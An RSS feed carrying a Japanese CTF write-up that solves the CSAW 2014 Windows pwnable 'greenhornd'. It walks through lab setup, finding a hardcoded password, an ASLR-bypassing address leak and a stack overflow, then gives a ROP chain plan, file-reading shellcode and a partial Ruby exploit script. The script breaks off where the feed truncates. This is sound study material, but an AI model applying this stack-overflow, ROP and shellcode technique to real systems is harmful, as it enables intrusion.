<?xml version="1.0" encoding="utf-8" standalone="yes" ?>




<?xml-stylesheet type="text/xsl" href="#stylesheet" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" exclude-result-prefixes="xsl">
    <xsl:output method="html" doctype-system="about:legacy-compat" />
    <xsl:template match="/rss">
      <html lang="en-us">
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Writeup RSS | $ make life</title>
          <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=" />
        </head>
        <body>
          <nav class="u-background">
  <div class="u-wrapper">
    <ul class="Banner">
      <li class="Banner-item Banner-item--title">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/">$ make life</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/about/">About</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/post/">Posts</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/tags/">Tags</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/categories/">Categories</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/index.xml">RSS</a>
      </li>
      
    </ul>
  </div>
</nav>
          <main>
            <div class="u-wrapper">
              <div class="u-padding">
                <h2 class="Heading-title">
                  
                  <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/categories/writeup/index.xml" rel="bookmark">Writeup RSS</a>
                  
                </h2>
                
                <p>
                  To subscribe to this RSS feed, copy its address and paste it into your favorite feed reader.
                </p>
                
              </div>
            </div>
          </main>
          
<footer class="Footer">
  <div class="u-wrapper">
    <div class="u-padding">
      Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/" rel="license"> Creative Commons Attribution 4.0 International License</a>.
    </div>
  </div>
</footer>

        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
  <channel>
    <title>Writeup on $ make life</title>
    <link>https://owlinux1000.github.io/blog/categories/writeup/</link>
    <description>Recent content in Writeup on $ make life</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 19 Sep 2019 23:49:38 +0900</lastBuildDate>
    <atom:link href="https://owlinux1000.github.io/blog/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CSAW CTF 2014 Greenhornd writeup</title>
      <link>https://owlinux1000.github.io/blog/post/greenhornd_writeup/</link>
      <pubDate>Thu, 19 Sep 2019 23:49:38 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/greenhornd_writeup/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhornd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。&lt;/p&gt;

&lt;h2 id=&#34;1-環境準備&#34;&gt;1. 環境準備&lt;/h2&gt;

&lt;h3 id=&#34;1-1-windows-os-の準備&#34;&gt;1.1 Windows OS の準備&lt;/h3&gt;

&lt;p&gt;Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、&lt;a href=&#34;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&#34;&gt;Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development&lt;/a&gt; を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。&lt;/p&gt;

&lt;h3 id=&#34;1-2-解析環境の準備&#34;&gt;1.2 解析環境の準備&lt;/h3&gt;

&lt;p&gt;本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&amp;amp;Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。)  最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。&lt;/p&gt;

&lt;p&gt;次に、本問題フアィルと解析する際にVM側に必要なソフトウェアをダウンロードする。以下に列挙する。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/greenhornd.exe&#34;&gt;greenhornd.exe&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;問題のバイナリファイル&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/AppJailLauncher.exe&#34;&gt;AppJailLauncher.exe&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Windows におけるPwn 問題を動作させる定番のソフトウェア(らしい)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.microsoft.com/ja-jp/download/details.aspx?id=40784&#34;&gt;Visual Studio 2013 の Visual C++ 再頒布可能パッケージ&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;greenhornd を実行しようとすると「msvcr120.dll」が無いためにエラーになるのでインストールする&lt;/li&gt;
&lt;li&gt;ちなみにmsvcr120.dll は、libcに入っているような標準的な関数を提供するDLL&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://visualstudio.microsoft.com/ja/downloads/?rr=https%3A%2F%2Fdocs.microsoft.com%2Fja-jp%2Fvisualstudio%2Finstall%2Finstall-visual-studio%3Fview%3Dvs-2019&#34;&gt;Visual Studio 2019&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;PoC 作成用に利用&lt;/li&gt;
&lt;li&gt;特に個別パッケージのMSVC vXXX - VS 2019 C++ x64/x86 build tools には、cl や dumpbin など便利なコマンドが多いのでインストール推奨&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://x64dbg.com/#start&#34;&gt;x64dbg&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Windows における代表的なデバッガの1つ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.winitor.com/get.html&#34;&gt;PeStudio&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;PEビューワ、マルウェア解析などでも必須となるアイテム&lt;/li&gt;
&lt;li&gt;でかいファイルを扱うと重い&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.nirsoft.net/utils/dll_export_viewer.html&#34;&gt;DLL Export Viewer&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;DLL がExplortする関数一覧の閲覧や検索ができるGUIソフト&lt;/li&gt;
&lt;li&gt;比較的大きなDLLでもさばけるためDLLから関数を探す時などはこちらを利用&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/download-the-wdk&#34;&gt;cdb, Windbgなどのデバッグツール&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;シェルコードのデバッグやPoC 用に利用&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ホスト側には概ね以下のソフトウェアが入っていれば良いだろう。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;exploit コードを作成するためのプログラミング環境 (Python, Rubyなど)&lt;/li&gt;
&lt;li&gt;rp++ などのROP Gadget 検索ツール&lt;/li&gt;
&lt;li&gt;IDA, Ghidra などの逆アセンブラ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;必要なソフトウェアのインストールなどが終わったら次に実際に&lt;code&gt;greenhornd.exe&lt;/code&gt; を問題のように動作させてみる。動作させる際には前述した&lt;code&gt;AppJailLauncher.exe&lt;/code&gt; を利用する。デスクトップなどに、以下の内容の&lt;code&gt;run.bat&lt;/code&gt; を作成する。これでダブルクリックでいつでも問題を動作させることができる。また、同じディレクトリに&lt;code&gt;greenhornd.exe&lt;/code&gt; と&lt;code&gt;key&lt;/code&gt; というファイル名でFLAGを書いたテキストファイルを用意しておこう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実際にダブルクリックすると以下のような画面になる。その後、ホストマシンから、本VMの9998番ポートへ向けて接続してみよう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;nc &amp;lt;VMのIPアドレス&amp;gt; 9998&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;正しく動作していれば、Passsword を求められる文字列が帰ってくるはずだ。ここまでが設定できれば、あとは解析をスタートさせることができる。&lt;/p&gt;

&lt;h2 id=&#34;2-解析&#34;&gt;2. 解析&lt;/h2&gt;

&lt;p&gt;まずは、先程nc でつないだところからのスタートだ。パスワードの入力を求められているので、バイナリ中からパスワードを探そう。この時重要なのは、本問題はPwnableであってReversingではない。つまり、難しい技を使ってパスワードを隠していることは考えにくい。そこで、手始めにstrings コマンドとgrep でpasswordを引っ掛けてみよう。grep で検索をかける際には、大文字小文字を無視する-i オプションを付けておくと良い。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;strings greenhornd.exe | grep -i password
To continue, you&amp;#39;re going to need the password. You can get the password by running strings from minsys (strings - greenhorn.exe) or locate it in IDA.
Password: 
GreenhornSecretPassword!!!
Incorrect Password.
Password accepted.&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この結果から、気になる文章はあるものの、&lt;code&gt;GreenhornSecretPassword!!!&lt;/code&gt; が怪しいと感じるだろう。nc でつないで、この文字列を入力してみよう。そうすると、さらに応答が進み選択画面が出てくるはずだ。割愛するが、重要な選択肢は、(A)と(V)だ。(A) を選ぶと、PEファイルのベースアドレスとスタックのアドレスがリークする。つまり、Windows におけるASLRをBypassすることが可能となる。(V) を選択すると1024 byteの入力を行うことができる。この2つ以外はどれも説明の文字列が帰ってくるだけだ。&lt;/p&gt;

&lt;p&gt;今回は、Ghidra を用いて逆アセンブル、逆コンパイル結果を見ながら詳細な解析を勧めていく。PeStudioなどの.textセクションのvirtual address や文字列などを起点にxref機能などを使ってバイナリ中を動き回ると、&lt;code&gt;0x401000&lt;/code&gt; がmain関数にあたる部分だとわかる。さらに、下図からも先程入力したパスワードがstrncmp関数で比較されており正しいことがわかる。解析する際には、積極的に関数名や変数名をわかりやすい形に変更していくことをおすすめする。Ghidra はまだ世に出て慣れ親しんでいない人も多いので、&lt;a href=&#34;https://booth.pm/ja/items/1575255&#34;&gt;Ghidra Pro Book&lt;/a&gt; を一読することをおすすめする。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/UIkarAm&#34; alt=&#34;main関数付近のデコンパイル画面&#34; /&gt;&lt;/p&gt;

&lt;p&gt;さらにswitch 文のところから、(V)の処理の実際の関数は、&lt;code&gt;0x401210&lt;/code&gt;だとわかるので見てみる。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/sNFqhmW&#34; alt=&#34;選択肢Vの関数&#34; /&gt;&lt;/p&gt;

&lt;p&gt;中では、0x800 という引数があることがわかる。読み込む処理が本処理しかないため、この値は読み込みバイト数だと推測できるが、促されている長さは1024なためBuffer Overflow が発生するとわかる。さらに条件分岐で、&lt;code&gt;C&lt;/code&gt; の文字が先頭に入っているとexit処理に移る。実際にデバッガでこの周辺処理や1024文字以上を入力した場合の挙動を見てみると、ebpレジスタが指すアドレスの次のワードがreturn address になっていることがわかる。今回の場合、return address が格納されたアドレスが&lt;code&gt;0x03CFAC0&lt;/code&gt; 、入力するバッファの先頭アドレスが&lt;code&gt;0x03CF6C0&lt;/code&gt; だったので、先頭から1028byte分のパディングをした後に、return address を書き換えることが可能だとわかる。これで、EIPは奪えたことになる。(こういった動的なデバッグの際には、攻撃コードを送る手前で、exploitコード側で標準入力を受け付けておき、デバッガで対象プロセスにアタッチし、ブレークポイントを貼って、exploitコードで適当なキーを叩き実行を進めて止めるやり方が便利。)&lt;/p&gt;

&lt;p&gt;ここまでの情報を整理すると、以下のようになる。これらを踏まえてExploit 作成に移る。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;1028 バイトのパディングを入れることで、Return address を書き換えることができる&lt;/li&gt;
&lt;li&gt;PEのベースアドレスとスタックのアドレスは、リーク可能&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;3-exloit-コードの作成&#34;&gt;3. Exloit コードの作成&lt;/h2&gt;

&lt;p&gt;まずは、Exploit の方針を明示する。今回は、VirtualAlloc関数を使って、スタックの領域をRWXな領域に変更し、シェルコードを実行して、keyファイルの内容を出力する方針を取る。VirtualAlloc関数の実アドレスは、0x402000(RVA) に存在するため、ROPで本アドレスの中にあるアドレスにジャンプすることを試みる。本コードには、switch文があり、&lt;code&gt;dword[ecx*4+0x401160]&lt;/code&gt; にjmpする処理が存在する。そのため、ecxを適切な値にしてこのjmp処理に制御を移すことで任意のアドレスにjmpすることができる。そこで、バイナリ中に&lt;code&gt;pop ecx; ret&lt;/code&gt; が行えるROP Gadgetがあるか調べると、いくつかGadget が見つかるため、本方針でVirtualAlloc関数に飛ばすことは可能だと考えられる。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ rp-osx-x64 -r &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; -f greenhornd.exe | grep &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pop ecx&amp;#39;&lt;/span&gt;
0x0040178c: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;
0x004018b5: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;
0x00401c20: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、VirtualAllocでスタックのパーミッションを書き換えた後に実行するシェルコードについて考えてみる。Linux と異なりWindows の場合システムコール番号などが各種OSで異なっておりLinux に比べて生のシステムコールを読ぶのは汎用性が低いシェルコードになってしまう。そのため、Windowsの場合はWin32 APIを呼び出して実行するシェルコードを作成する。今回は、&lt;code&gt;key&lt;/code&gt; というファイルの中身を見たいので、ファイルを開いて、読み出し、書き出す処理を行う必要がある。そこで、PEバイナリに含まれているReadFileやWriteFileを用いれば良いと考えられるが、これらの関数を実行するためには事前に対象ファイルのファイルハンドラを取得する必要があり、そのためには引数の多いCreateFile関数を呼ばなくてはならない。今回の場合は特に成約が厳しくないが、長さ制限などがある場合は、&lt;code&gt;_open&lt;/code&gt;, &lt;code&gt;_read&lt;/code&gt;, &lt;code&gt;_write&lt;/code&gt; を使ってLinuxライクなシェルコードを作成して短くする方法がある。今回は、その方針で作成した。Windows におけるシェルコード作成方法などについては、&lt;a href=&#34;http://inaz2.hatenablog.com/entry/2015/04/23/013858&#34;&gt;Windowsで電卓を起動するシェルコードを書いてみる&lt;/a&gt; がとてもわかりやすいので参照してほしい。今回は、本サイトのシェルコードを改変する形で以下のシェルコードを作成した。mainラベルより上はサイトと全く同じため省略する。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;color:#a0a000&#34;&gt;main:&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0079656&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;bh&lt;/span&gt;	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; key
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#800&#34;&gt;esp&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e12e0c6eh&lt;/span&gt;  	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; open(&amp;#34;key&amp;#34;, 0, 0)
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebx&lt;/span&gt;, &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;        &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; ファイルディスクリプタをebxに退避
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;		    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; len
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;lea&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;, [&lt;span style=&#34;color:#800&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;]	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; buffer
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;            
    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebx&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e70e09a4h&lt;/span&gt;	    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; read(fd, esp+100h, 100h)
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;067&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;a78ad5h&lt;/span&gt;	    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; write(fd, esp+100h, 100h)
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e2d87eh&lt;/span&gt;      &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; ExitProcess
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;

&lt;span style=&#34;color:#00f&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;start&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後に、以下にexploit の全体コードを示す。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

host &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;192.168.0.109&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;9998&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new host, port
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:info&lt;/span&gt;

password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;GreenhornSecretPassword!!!&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Password: &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Password: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline password
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Selection: &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select A to leak and calculate some addresses&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;
tmp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Selection: &amp;#34;&lt;/span&gt;
text_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/is: (.*) /&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
stack_addr &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/at: (.*)\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
pop_ecx_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040178c&lt;/span&gt;
jmp_memory &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040110d&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;image base address        : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% text_base
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Stack address             : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% stack_addr
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pop ecx; ret              @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% pop_ecx_ret
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;jmp dword[0x401160+ecx*4] @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% jmp_memory
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select V to overflow&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;V&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;).&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

